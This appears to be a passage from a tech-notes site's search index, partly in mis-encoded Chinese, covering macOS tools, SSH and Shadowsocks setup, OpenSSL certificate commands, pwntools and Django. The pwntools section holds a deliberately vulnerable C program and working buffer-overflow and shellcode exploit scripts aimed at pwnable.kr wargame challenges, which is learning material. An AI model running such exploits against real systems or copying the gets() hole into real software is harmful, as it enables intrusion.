qlstepenï¼šå¯ä»¥é¢„è§ˆæ²¡æœ‰åç¼€çš„æ–‡æœ¬æ–‡ä»¶ï¼› qlmarkdownï¼šå¯ä»¥é¢„è§ˆ markdown æ–‡ä»¶çš„æ¸²æŸ“æ•ˆæœï¼› quicklook-jsonï¼šæä¾›äº†å¯¹ json æ–‡ä»¶çš„æ ¼å¼åŒ–å’Œé«˜äº®æ”¯æŒï¼› betterzipï¼šç”¨äºé¢„è§ˆ zip æ–‡ä»¶çš„å†…å®¹ï¼ˆéœ€è¦ä»˜è´¹ï¼‰ï¼› qlimagesizeï¼šå¯ä»¥ç”¨æ¥å±•ç¤ºå›¾ç‰‡çš„åƒç´ å’Œå¤§å°ï¼› webpquicklookï¼šå¯ä»¥æŸ¥çœ‹ webp æ ¼å¼çš„ç…§ç‰‡ï¼› qlvideoï¼šé¢„è§ˆå„ç§è§†é¢‘æ–‡ä»¶ï¼› provisionqlï¼šå¯ä»¥é¢„è§ˆ .app æˆ– .ipa åç¼€çš„æ–‡ä»¶ï¼› quicklookapkï¼šé¢„è§ˆ apk æ–‡ä»¶ä¿¡æ¯ï¼›  "},{"id":118,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/macos/2.mac%E5%B7%A5%E4%BD%9C%E6%B5%81/","title":"2. Macå·¥ä½œæµ","section":"MacOS","content":"Mac å·¥ä½œæµ #  é‚®ä»¶ #  Mac OS è‡ªå¸¦çš„é‚®ç®±ç³»ç»Ÿå¯ä»¥é€šè¿‡æ¨¡å¼åŒ¹é…å¯¹é‚®ä»¶è¿›è¡Œä¸€äº›æ“ä½œã€‚\nitem2 #  ä¸€ä¸ªç»ˆç«¯è½¯ä»¶ï¼ˆè¿™ä¸ªæˆ‘æ²¡è£…ï¼ŒèŠ±é‡Œèƒ¡å“¨çš„ï¼Œè·Ÿ hyperã€cmder è¿™äº›åº”è¯¥å·®ä¸å¤§ï¼‰ï¼›\nSSH é…ç½® #  è·Ÿ Linux ä¸‹çš„å·®ä¸å¤šã€‚\nè¿™é‡Œå†™çš„ä¸€äº› ssh å…¨å±€é…ç½®è¿˜æ˜¯æ¯”è¾ƒæœ‰ç”¨çš„ï¼š\nHost * ForwardAgent yes ServerAliveInterval 10 ServerAliveCountMax 10000 TCPKeepAlive no ControlMaster auto ControlPath ~/.ssh/%h-%p-%r ControlPersist 4h Compression yes å…¶ä¸­ï¼š\n ForwardAgent ç½®ä¸º YES è¡¨ç¤ºï¼Œå±‚çº§ ssh é“¾æ¥å°†ä½¿ç”¨ç›´æ¥é“¾æ¥ï¼› ServerAliveInterval ä¸ ServerAliveCountAlive çš„è®¾ç½®æ˜¯ä¸ºäº†é˜²æ­¢æœåŠ¡å™¨ä¸»åŠ¨åˆ‡æ–­è¿æ¥ï¼Œä¿æŒè¿æ¥è€Œå‘æœåŠ¡å™¨å‘é€å¿ƒè·³åŒ…ï¼ŒäºŒè€…è®¾ç½®åˆ†åˆ«ä¸ºå¿ƒè·³åŒ…çš„é—´éš”æ—¶é—´ä¸æœ€å¤§çš„å¿ƒè·³åŒ…å‘é€æ¬¡æ•°ã€‚ ControlMaster è¡¨ç¤ºæ¯æ¬¡è¿æ¥éƒ½ä¼šå»ºç«‹ä¸€ä¸ª socket æ–‡ä»¶ï¼›ControlPath è¡¨ç¤ºè¿™ä¸ª socket çš„ä½ç½®ï¼›ControlPersist è¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶ä¼šå­˜åœ¨å››ä¸ªå°æ—¶ã€‚è¿›è¡Œè¿™ä¸ªè®¾ç½®å¯ä»¥åŠ å¿«ä¸‹æ¬¡çš„è¿æ¥ã€‚  ç§‘å­¦ä¸Šç½‘ #  æ ¹æ®ä¸åŒçš„éœ€æ±‚ï¼ŒMac OS ä¸­ç§‘å­¦ä¸Šç½‘ï¼Œä¸»è¦ç”¨åˆ°ä¸‹é¢çš„å‡ ä¸ªå·¥å…·ï¼š\n  Proxifierï¼š å…¨å±€æ§åˆ¶å·¥å…·ï¼Œè´Ÿè´£åº”ç”¨å±‚é¢çš„è¯·æ±‚è½¬å‘ï¼›\n  Charlesï¼šä¸€ç§ä»£ç†ï¼Œè´Ÿè´£å¤„ç†é‚£äº›éœ€è¦è¢«æŠ“åŒ…çš„è¯·æ±‚ï¼›\n  sslocalï¼š ss ä»£ç†çš„å®¢æˆ·ç«¯ï¼Œè´Ÿè´£å¤„ç†é‚£äº›éœ€è¦èµ° Shadowsocks åè®®çš„è¯·æ±‚ï¼›\n  SwitchyOmegaï¼šChrome æ‹“å±•å·¥å…·ï¼Œè´Ÿè´£å¯¹ Chrome ä¸­çš„ç½‘é¡µè¿›è¡Œæ™ºèƒ½ä»£ç†é€‰æ‹©ã€‚\n  é‚£ä¹ˆå¦‚ä½•è¿›è¡Œç§‘å­¦ä¸Šç½‘å‘¢ï¼Ÿ\n  é¦–å…ˆæˆ‘ä»¬éœ€è¦ç§Ÿä¸€ä¸ªå›½å¤–çš„æœåŠ¡å™¨ï¼Œç„¶ååœ¨ä¸Šé¢è¿è¡Œ shadowsocks æœåŠ¡ï¼›\n  å¦‚ä½•åœ¨æœ¬åœ°è¿è¡Œ shadowsocks å‘¢ï¼Ÿ\n$ nohup sslocal -q -c shadowsocks.json \u0026amp;    "},{"id":119,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/1.aboutcsr/","title":"1. About Csr","section":"OpenSSL","content":"About Certificate Signing Requests (CSRs) #  graph TB;\rsubgraph Client;\rF{Infomation};\rPK1(\u0026#34;PrivateKey(*.key)\u0026#34;); PK2(\u0026#34;PublicKey(*.pub)\u0026#34;); DN(\u0026#34;DistinguisedName(DN)\u0026#34;)\rCSR(\u0026#34;CertificateSigningRequest(*.csr)\u0026#34;)\rF---PK1; F---PK2; F---DN;\rPK2--\u0026gt;CSR; DN--\u0026gt;CSR\rCRTclient(\u0026#34;ClientCertificate(*.crt)\u0026#34;)\rend\rsubgraph CAroot;\rCRTroot(\u0026#34;CACertificate(*.crt)\u0026#34;)\rend\rCSR--\u0026gt;|request|CRTroot\rCRTroot--\u0026gt;|sign|CRTclient If you would like to obtain an SSL certificate from a certificate authority (CA), you must generate a certificate signing request (CSR). A CSR consists mainly of the public key of a key pair, and some additional information.\nWhenever you generate a CSR, you will be prompted to provide information regarding the certificate. This information is known as a Distinguised Name (DN). An important field in the DN is the Common Name(CN), which should be the exact Fully Qualified Domain Name (FQDN) of the host that you intend to use the certificate with. It is also possible to skip the interactive prompts when creating a CSR by passing the information via command line or from a file.\nHere is an example of what the CSR information prompt will look like:\n--- Country Name (2 letter code) [AU]:US State or Province Name (full name) [Some-State]:New York Locality Name (eg, city) []:Brooklyn Organization Name (eg, company) [Internet Widgits Pty Ltd]:Example Brooklyn Company Organizational Unit Name (eg, section) []:Technology Division Common Name (e.g. server FQDN or YOUR name) []:examplebrooklyn.com Email Address []: If you want to non-interactively answer the CSR information prompt, you can do so by adding the -subjoption to any OpenSSL commands that request CSR information. Here is an example of the option, using the same information displayed in the code block above:\n-subj \u0026#34;/C=US/ST=New York/L=Brooklyn/O=Example Brooklyn Company/CN=examplebrooklyn.com\u0026#34; "},{"id":120,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/2.generatecsr/","title":"2. Generate Csr","section":"OpenSSL","content":"Generating CSRs #  Generate a private key and a CSR #  This command creates a 2048-bit private key (domain.key) and a CSR (domain.csr) from scratch:\n$ openssl req \\  -newkey rsa:2048 -nodes -keyout domain.key \\  -out domain.csr   The -newkey rsa:2048 option specifies that the key should be 2048-bit, generated using the RSA algorithm.\n  The -nodes option specifies that the private key should not be encrypted with a pass phrase.\n  The -new option, which is not included here but implied, indicates that a CSR is being generated.\n  Generate a CSR from a existing private key #  This command creates a new CSR (domain.csr) based on an existing private key (domain.key):\n$ openssl req \\  -key domain.key \\  -new -out domain.csr  The -key option specifies an existing private key (domain.key) that will be used to generate a new CSR. The -new option indicates that a CSR is being generated.  Generate a CSR from an existing certificate and private key #  This command creates a new CSR (domain.csr) based on an existing certificate (domain.crt) and private key (domain.key):\n$ openssl x509 \\  -in domain.crt \\  -signkey domain.key \\  -x509toreq -out domain.csr  The -x509toreq option specifies that you are using an X509 certificate to make a CSR.  "},{"id":121,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/3.generatessl/","title":"3. Generate Ssl","section":"OpenSSL","content":"Generating SSL Certificates #  If you would like to use an SSL certificate to secure a service but you do not require a CA-signed certificate, a valid (and free) solution is to sign your own certificates.\nA common type of certificate that you can issue yourself is a self-signed certificate. Therefore, self-signed certificates should only be used if you do not need to prove your service\u0026rsquo;s identity to its users (e.g. non-production or non-public servers).\nGenerate a self-signed certificate #  This command creates a 2048-bit private key (domain.key) and a self-signed certificate (domain.crt) from scratch:\n$ openssl req \\  -newkey rsa:2048 -nodes -keyout domain.key \\  -x509 -days 365 -out domain.crt  The -x509 option tells req to create a self-signed certificate. The -days 365 option specifies that the certificate will be valid for 365 days. A temporary CSR is generated to gather information to associate with the certificate.  Generate a self-signed certificate from a existing private key #  This command creates a self-signed certificate (domain.crt) from an existing private key (domain.key):\n$ openssl req \\  -key domain.key \\  -new \\  -x509 -days 365 -out domain.crt  The -x509 option tells req to create a self-signed certificate.  "},{"id":122,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/4.viewcertificate/","title":"4. View Certificate","section":"OpenSSL","content":"View Certificates #  CSR Entries #  This command allows you to view and verify the contents of a CSR (domain.csr) in plain text:\n$ openssl req -text -noout -verify -in domain.csr Certificate Entries #  This command allows you to view the contents of a certificate (domain.crt) in plain text:\n$ openssl x509 -text -noout -in domain.crt Verify a Certificate was Signed by a CA #  Use this command to verify that a certificate (domain.crt) was signed by a specific CA certificate (ca.crt):\n$ openssl verify -verbose -CAFile ca.crt domain.crt "},{"id":123,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/5.privatekey/","title":"5. Private Key","section":"OpenSSL","content":"Private Key #  Create a Private Key #  Use this command to create a password-protected, 2048-bit private key (domain.key):\n$ openssl genrsa -des3 -out domain.key 2048 Verify a Private Key #  Use this command to check that a private key (domain.key) is a valid key:\n$ openssl rsa -check -in domain.key Verify a Private Key Matches a Certificate and CSR #  Use these commands to verify if a private key (domain.key) matches a certificate (domain.crt) and CSR (domain.csr):\n$ openssl rsa -noout -modulus -in domain.key | openssl md5  $ openssl x509 -noout -modulus -in domain.crt | openssl md5  $ openssl req -noout -modulus -in domain.csr | openssl md5 Encrypt a Private Key #  This takes an unencrypted private key (unencrypted.key) and outputs an encrypted version of it (encrypted.key):\n$ openssl rsa -des3 \\  -in unencrypted.key \\  -out encrypted.key Decrypt a Private Key #  This takes an encrypted private key (encrypted.key) and outputs a decrypted version of it (decrypted.key):\n$ openssl rsa \\  -in encrypted.key \\  -out decrypted.key "},{"id":124,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/6.convertformats/","title":"6. Convert Formats","section":"OpenSSL","content":"Convert Formats #  All of the certificates that we have been working with have been X.509 certificates that are ASCII PEM encoded.\nOpenSSL can be used to convert certificates to and from a large variety of these formats. This section will cover a some of the possible conversions.\nConvert PEM to DER #  Use this command if you want to convert a PEM-encoded certificate (domain.crt) to a DER-encoded certificate (domain.der), a binary format:\n$ openssl x509 \\  -in domain.crt \\  -outform der -out domain.der Convert DER to PEM #  Use this command if you want to convert a DER-encoded certificate (domain.der) to a PEM-encoded certificate (domain.crt):\n$ openssl x509 \\  -inform der -in domain.der \\  -out domain.crt Convert PEM to PKCS7 #  Use this command if you want to add PEM certificates (domain.crt and ca-chain.crt) to a PKCS7 file (domain.p7b):\n$ openssl crl2pkcs7 -nocrl \\  -certfile domain.crt \\  -certfile ca-chain.crt \\  -out domain.p7b Note that you can use one or more -certfile options to specify which certificates to add to the PKCS7 file.\nPKCS7 files, also known as P7B, are typically used in Java Keystores and Microsoft IIS (Windows). They are ASCII files which can contain certificates and CA certificates.\nConvert PKCS7 to PEM #  Use this command if you want to convert a PKCS7 file (domain.p7b) to a PEM file:\n$ openssl pkcs7 \\  -in domain.p7b \\  -print_certs -out domain.crt Convert PEM to PKCS12 #  Use this command if you want to take a private key (domain.key) and a certificate (domain.crt), and combine them into a PKCS12 file (domain.pfx):\n$ openssl pkcs12 \\  -inkey domain.key \\  -in domain.crt \\  -export -out domain.pfx Convert PKCS12 to PEM #  Use this command if you want to convert a PKCS12 file (domain.pfx) and convert it to PEM format (domain.combined.crt):\n$ openssl pkcs12 \\  -in domain.pfx \\  -nodes -out domain.combined.crt "},{"id":125,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/pwntools/1.gettingstarted/","title":"1. Getting Started","section":"PwnTools","content":" å­¦ä¹ ç½‘å€ï¼šhttp://docs.pwntools.com/en/stable/intro.html\n Getting Started #  from pwn import * This imports a lot of functionality into the global namespace. You can now assemble, disassemble, pack, unpack, and many other things with a single function.\nA full list of everything that is imported is available on from pwn import \nMaking Connections #  Pwntools talk to the challenge binary in order with its pwnlib.tubes module.\nRemote connect #  pwnlib.tubes.remoteï¼š\n\u0026gt;\u0026gt;\u0026gt; from pwn import * \u0026gt;\u0026gt;\u0026gt; conn = remote(\u0026#34;ftp.ubuntu.com\u0026#34;,21) \u0026gt;\u0026gt;\u0026gt; conn.recvline() \u0026#39;220 ...\u0026#39; \u0026gt;\u0026gt;\u0026gt; conn.send(\u0026#39;USER anonymous\\r\\n\u0026#39;) \u0026gt;\u0026gt;\u0026gt; conn.recvuntil(\u0026#39; \u0026#39;, drop=True) \u0026#39;331\u0026#39; \u0026gt;\u0026gt;\u0026gt; conn.recvline() \u0026#39;Please specify the password.\\r\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; conn.close()  NOTICE:\nThe \\n at the end of input is important because most c like program treat \\n as the sign to flush buffer area.\n It\u0026rsquo;s also easy to spin up a listener:\n\u0026gt;\u0026gt;\u0026gt; from pwn import * \u0026gt;\u0026gt;\u0026gt; l = listen(8080) \u0026gt;\u0026gt;\u0026gt; r = remote(\u0026#39;localhost\u0026#39;, l.lport) \u0026gt;\u0026gt;\u0026gt; c = l.wait_for_connection() \u0026gt;\u0026gt;\u0026gt; r.send(\u0026#39;hello\u0026#39;) \u0026gt;\u0026gt;\u0026gt; c.recv() Processes connect #  pwnlib.tubes.processï¼š\n\u0026gt;\u0026gt;\u0026gt; sh = process(\u0026#39;/bin/sh\u0026#39;) \u0026gt;\u0026gt;\u0026gt; sh.sendline(\u0026#39;sleep 3; echo hello world;\u0026#39;) \u0026gt;\u0026gt;\u0026gt; sh.recvline(timeout=1) \u0026#39;\u0026#39; \u0026gt;\u0026gt;\u0026gt; sh.recvline(timeout=5) \u0026#39;hello world\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; sh.close() Not only can you interact with processes programmatically, but you can actually interact with processes.\n\u0026gt;\u0026gt;\u0026gt; sh.interactive() $ whoami user SSH connect #  pwnlib.tubes.sshï¼š\n\u0026gt;\u0026gt;\u0026gt; shell = ssh(\u0026#39;bandit0\u0026#39;, \u0026#39;bandit.labs.overthewire.org\u0026#39;, password=\u0026#39;bandit0\u0026#39;, port=2220) \u0026gt;\u0026gt;\u0026gt; shell[\u0026#39;whoami\u0026#39;] \u0026#39;bandit0\u0026#39; \u0026gt;\u0026gt;\u0026gt; shell.download_file(\u0026#39;/etc/motd\u0026#39;) \u0026gt;\u0026gt;\u0026gt; sh = shell.run(\u0026#39;sh\u0026#39;) \u0026gt;\u0026gt;\u0026gt; sh.sendline(\u0026#39;sleep 3; echo hello world;\u0026#39;) \u0026gt;\u0026gt;\u0026gt; sh.recvline(timeout=1) \u0026#39;\u0026#39; \u0026gt;\u0026gt;\u0026gt; sh.recvline(timeout=5) \u0026#39;hello world\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; shell.close() "},{"id":126,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/pwntools/%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B/","title":"æ–°æ‰‹æ•™ç¨‹","section":"PwnTools","content":" å­¦ä¹ ç½‘å€ï¼š\n https://bbs.pediy.com/thread-247217.htm   pwntools æ–°æ‰‹æ•™ç¨‹ #  Hello World #  C ç¨‹åºæºä»£ç ï¼ˆ./1.cï¼‰ï¼š\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;void func(int key){  char overflowme[32];  printf(\u0026#34;overflow me : \u0026#34;);  gets(overflowme); // smash me!  if(key == 0xcafebabe){  system(\u0026#34;/bin/sh\u0026#34;);  }  else{  printf(\u0026#34;Nah..\\n\u0026#34;);  } } int main(int argc, char* argv[]){  func(0xdeadbeef);  return 0; } exp è„šæœ¬ï¼ˆ./1.pyï¼‰ï¼š\nfrom pwn import * c = remote(\u0026#34;pwnable.kr\u0026#34;, 9000) c.sendline(\u0026#34;AAAA\u0026#34; * 13 + p32(0xcafebabe)) c.interactive() ShellCode #  è·å–æºç å’Œå¯æ‰§è¡Œæ–‡ä»¶çš„æ–¹å¼ï¼Œéœ€è¦å…ˆé€šè¿‡ ssh è¿æ¥çš„ç›®æ ‡ä¸»æœºï¼š\nssh -p2222 asm@pwnable.kr # è¾“å…¥å¯†ç  guest æˆ–è€…ç›´æ¥é€šè¿‡ scp ä¸‹è½½æ–‡ä»¶ï¼š\nscp -P 2222 asm@pwnable.kr:~/asm ./ # è¾“å…¥å¯†ç  guest  scp -P 2222 asm@pwnable.kr:~/asm.c ./ # è¾“å…¥å¯†ç  guest exp.py çš„å†…å®¹ï¼š\nfrom pwn import *  p = process(\u0026#34;./asm\u0026#34;) context.log_level = \u0026#39;DEBUG\u0026#39; gdb.attach(p)  context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;)  shellcode = shellcraft.amd64.pushstr(\u0026#34;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\u0026#34;) shellcode += shellcraft.amd64.linux.open(\u0026#39;rsp\u0026#39;,0,0) shellcode += shellcraft.amd64.linux.read(\u0026#39;rax\u0026#39;,\u0026#39;rsp\u0026#39;,0) shellcode += shellcraft.amd64.linux.write(1, \u0026#39;rsp\u0026#39;, 100)  p.recvuntil(\u0026#39;shellcode: \u0026#39;) p.send(asm(shellcode)) log.success(p.recvall()) é™¤äº† I/O, process è¿”å›çš„å¯¹è±¡å¯ä»¥é€šè¿‡ gdb.attach(p) å°†è¿›ç¨‹ attach åˆ° gdb ä¸Šã€‚Attach ä¹‹åï¼Œgdb ä¾¿å¯ä»¥è°ƒè¯•è¯¥ç¨‹åºæ¥ï¼ˆè®¾ç½® breakpointsï¼ŒæŸ¥çœ‹ stackï¼Œä»¥åŠç®€å•çš„åæ±‡ç¼–ï¼‰ã€‚\n"},{"id":127,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/celery/","title":"Celery","section":"Python","content":" å®˜æ–¹æ–‡æ¡£ï¼šhttp://docs.celeryproject.org/\n Celery #  celery æ˜¯ä¸€ä¸ªç”¨äºå®ç°å®šæ—¶ä»»åŠ¡çš„ python åº“ã€‚\nFirst Step with Django #   http://docs.celeryproject.org/en/latest/django/first-steps-with-django.html\n "},{"id":128,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/admin-site/","title":"Admin Site","section":"Django","content":" å®˜æ–¹æ–‡æ¡£ï¼šhttps://docs.djangoproject.com/en/2.1/ref/contrib/admin/\n Django admin site #  Overview #  If youâ€™re not using the default project template, here are the requirements:\n Add 'django.contrib.admin' and its dependencies -django.contrib.auth, django.contrib.contenttypes,django.contrib.messages, and django.contrib.sessions - to yourINSTALLED_APPS setting. Configure a DjangoTemplates backend in your TEMPLATES setting withdjango.contrib.auth.context_processors.auth anddjango.contrib.messages.context_processors.messages in the 'context_processors' option of OPTIONS. If youâ€™ve customized the MIDDLEWARE setting,django.contrib.auth.middleware.AuthenticationMiddlewareand django.contrib.messages.middleware.MessageMiddlewaremust be included. Hook the adminâ€™s URLs into your URLconf.  If you need to create a user to login with, use the createsuperuser command. By default, logging in to the admin requires that the user has the is_superuser or is_staff attribute set to True.\næ‰€ä»¥ï¼Œé™¤è¶…çº§ç”¨æˆ·å¤–ï¼Œè®¾ç½®ä¸€ä¸‹å±æ€§å³å¯å…è®¸ä¸€ä¸ªæ™®é€šç”¨æˆ·ç™»å½• admin åå°ç®¡ç†ç•Œé¢ï¼š\nnormal_user.is_staff = True Finally, determine which of your applicationâ€™s models should be editable in the admin interface. For each of those models, register them with the admin as described in ModelAdmin.ï¼ˆå³éœ€è¦é€šè¿‡ ModelAdmin æ³¨å†Œå¯ä»¥åœ¨ admin-site ä¸­ä¿®æ”¹çš„è¡¨å•ï¼‰\nOther topicsï¼š\n Admin actions The Django admin documentation generator JavaScript customizations in the admin  ModelAdmin #  Usage #  The ModelAdmin class is the representation of a model in the admin interface. Usually, these are stored in a file named admin.py in your application. Letâ€™s take a look at a very simple example of the ModelAdmin:\nfrom django.contrib import admin from myproject.myapp.models import Author  class AuthorAdmin(admin.ModelAdmin):  pass admin.site.register(Author, AuthorAdmin) å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä¸æ˜¾ç¤ºåœ°å£°æ˜ä¸€ä¸ª ModelAdminï¼Œè¿™æ—¶ï¼ŒDjango å°†ä¼šä½¿ç”¨é»˜è®¤çš„å€Ÿå£åšä¸ºå‡½æ•°çš„å‚æ•°ï¼š\nfrom django.contrib import admin from myproject.myapp.models import Author  admin.site.register(Author) register decorator #  There is also a decorator for registering your ModelAdmin classes:\nfrom django.contrib import admin from .models import Author  @admin.register(Author) class AuthorAdmin(admin.ModelAdmin):  pass Itâ€™s given one or more model classes to register with the ModelAdmin. If youâ€™re using a custom AdminSite, pass it using the site keyword argument:\nfrom django.contrib import admin from .models import Author, Editor, Reader from myproject.admin_site import custom_admin_site  @admin.register(Author, Reader, Editor, site=custom_admin_site) class PersonAdmin(admin.ModelAdmin):  pass Discovery of admin files #  æ²¡çœ‹æ‡‚ï¼Œç®—äº†ã€‚\nModelAdmin options #  The ModelAdmin is very flexible. It has several options for dealing with customizing the interface. All options are defined on the ModelAdmin subclass:\n ModelAdmin.actionsï¼šå¯ä»¥åœ¨ admin-site é¡µé¢çš„ä¸‹æ‹‰åˆ—è¡¨ä¸­ï¼Œå®šä¹‰è‡ªå·±çš„ actions å‡½æ•°ã€‚è¯¦è§ï¼šAdminAction ModelAdmin.actions_on_topã€ModelAdmin.actions_on_bottomï¼šæ§åˆ¶ä¸‹æ‹‰åˆ—è¡¨åœ¨ admin-site é¡µé¢ä¸­å­˜åœ¨çš„ä½ç½®ã€‚ ModelAdmin.actions_selection_counterï¼šæ§åˆ¶æ˜¯å¦åœ¨åŠ¨ä½œä¸‹æ‹‰æ é‡Œé¢æ˜¾ç¤ºé€‰æ‹©è®¡æ•°å™¨ã€‚  ï¼ˆè¿˜æœ‰å¾ˆå¤šï¼‰\nModelAdmin methods #  \u0026hellip;\nAdding custom validation to admin #  InlineModelAdmin #  Usage #  Important class:\n  class InlineModelAdmin\n  class TabularInline\n  class StackedInline\n  The admin interface has the ability to edit models on the same page as a parent model. These are called inlines.\nSuppose you have these two models:\nfrom django.db import models  class Author(models.Model):  name = models.CharField(max_length=100)  class Book(models.Model):  author = models.ForeignKey(Author, on_delete=models.CASCADE)  title = models.CharField(max_length=100) You can edit the books authored by an author on the author page. You add inlines to a model by specifying them in a ModelAdmin.inlines:\nfrom django.contrib import admin  class BookInline(admin.TabularInline):  model = Book  class AuthorAdmin(admin.ModelAdmin):  inlines = [  BookInline,  ] Django provides two subclasses of InlineModelAdmin and they are:\n TabularInline StackedInline  The difference between these two is merely the template used to render them.\nInlineModelAdmin options #  InlineModelAdmin shares many of the same features as ModelAdmin, and adds some of its own (the shared features are actually defined in theBaseModelAdmin superclass).\n"},{"id":129,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/django/authentication-system/","title":"Authentication System","section":"Django","content":" å­¦ä¹ ç½‘å€ï¼š\n https://www.jianshu.com/p/17d4c2182ef7 http://www.liujiangblog.com/course/django/178 https://docs.djangoproject.com/en/1.11/topics/auth/ https://juejin.im/post/5987f51e51882549475a916d  å®˜æ–¹çš„å‚è€ƒæ–‡æ¡£ï¼šhttps://docs.djangoproject.com/zh-hans/2.1/ref/contrib/auth/\n Authentication System #  Using the Django authentication system #  User Object #  User æ˜¯ Django æä¾›çš„ä¸€ä¸ªå¯¹è±¡ï¼Œé»˜è®¤å¯¹è±¡çš„ä¸»è¦å±æ€§æ˜¯ï¼šusernameï¼Œpasswordï¼Œemailï¼Œfirst_nameï¼Œlast_nameã€‚å‚é˜…å®Œæ•´çš„æ–‡æ¡£ï¼š\n  å…³äº User æ¨¡å—çš„æ“ä½œï¼ˆæ¯”å¦‚ï¼šä½¿ç”¨ create_user() å‡½æ•°åˆ›å»ºå¯¹è±¡ï¼‰\nfrom django.contrib.auth import get_user_model from django.contribute.auth.models import User # å¯¼å…¥ User è¿™ä¸ªæ¨¡å—æœ‰ä»¥ä¸Šä¸¤ç§æ–¹æ³•  User = get_user_model() # è¯¥è¡Œè·å¾— User è¿™ä¸ªæ¨¡å—ï¼Œä¸å¯¼å…¥çš„ User æŒ‡å‘åŒä¸€ä¸ªæ¨¡å—  Rookie_User = User.objects.create_user(\u0026#39;Rookie\u0026#39;, \u0026#39;email@e.com\u0026#39;, \u0026#39;passwd\u0026#39;) Rookie_User = User.objects.create(username=\u0026#34;Rookie001\u0026#34;) # åˆ›å»ºä¸€ä¸ªåä¸º â€˜Rookie001â€™ çš„ User å¯¹è±¡ï¼Œè¿”å›è¯¥å¯¹è±¡  User.objects.get(username=\u0026#34;Rookie001\u0026#34;) # æŸ¥æ‰¾ä¸€ä¸ªæ»¡è¶³ç‰¹å®šæ¡ä»¶çš„ User ç±»çš„å¯¹è±¡  Rookie_User.last_name = \u0026#39;Smith\u0026#39; # åŠ¨æ€è®¾ç½®å¯¹è±¡çš„å…¶ä»–æˆå‘˜  user.save() # å°†å¯¹è±¡ä¿å­˜åˆ°æ•°æ®åº“   åˆ›å»ºè¶…çº§ç”¨æˆ·ï¼šä½¿ç”¨ createsuperuser å‘½ä»¤ï¼š\n$ python manage.py createsuperuser --username=john --email=email@e.com   æ›´æ”¹å¯†ç ï¼šä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š\n$ python manage.py changepassword \u0026lt;username\u0026gt; from django.contrib.auth.models import User Rookie_User = User.objects.get(username=\u0026#39;john\u0026#39;) Rookie_User.set_password(\u0026#39;new_passwd\u0026#39;) Rookie_User.save()   éªŒè¯ç”¨æˆ·ï¼Œauthenticate å‡½æ•°å¦‚æœåç«¯æœ‰æ•ˆåˆ™è¿”å› User å¯¹è±¡ï¼Œè‹¥æ— æ•ˆæˆ–å¼•å‘ PermissionDenies åˆ™è¿”å› Noneï¼Œä¾‹å¦‚ï¼š\nfrom django.contrib.auth import authenticate user = authenticate(username=\u0026#39;john\u0026#39;, password=\u0026#39;secret\u0026#39;) if user is not None:  # A backend authenticated the credentials else:  # No backend authenticated the credentials   Permission and Authorization #  é»˜è®¤æƒ…å†µä¸‹ï¼Œä½¿ç”¨ python manage.py migrate å‘½ä»¤æ—¶ï¼ŒDjango ä¼šç»™æ¯ä¸ªå·²ç»å­˜åœ¨çš„ model æ·»åŠ é»˜è®¤çš„æƒé™ã€‚å‡è®¾æœ‰ä¸ªå« foo çš„åº”ç”¨ä¸­æœ‰ä¸ªå« bar çš„æ¨¡å—ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„å‘½ä»¤æŸ¥çœ‹æƒé™ï¼š\nuser.has_perm(\u0026#39;foo.add_bar\u0026#39;) # æŸ¥çœ‹ç”¨æˆ· user æ˜¯å¦æœ‰æ·»åŠ  bar è¿™ä¸ªæ¨¡å—å¯¹è±¡çš„æƒé™ user.has_perm(\u0026#39;foo.change_bar\u0026#39;) # æŸ¥çœ‹ç”¨æˆ· user æ˜¯å¦æœ‰æ›´æ”¹ bar è¿™ä¸ªæ¨¡å—å¯¹è±¡çš„æƒé™ user.has_perm(\u0026#39;foo.delete_bar\u0026#39;) # æŸ¥çœ‹ç”¨æˆ· user æ˜¯å¦æœ‰åˆ é™¤ bar è¿™ä¸ªæ¨¡å—å¯¹è±¡çš„æƒé™ Group Object #  Djangoæä¾›äº†ä¸€ä¸ª django.contrib.auth.models.Group æ¨¡å‹ï¼Œè¯¥modelå¯ç”¨äºç»™ç”¨æˆ·åˆ†ç»„ï¼Œå®ç°æ‰¹é‡ç®¡ç†ã€‚ç”¨æˆ·å’Œç»„å±äºå¤šå¯¹å¤šçš„å…³ç³»ã€‚ç”¨æ³•å®ä¾‹å¦‚ä¸‹ï¼š\nfrom django.contrib.auth.models import Group  Rookie_Group = 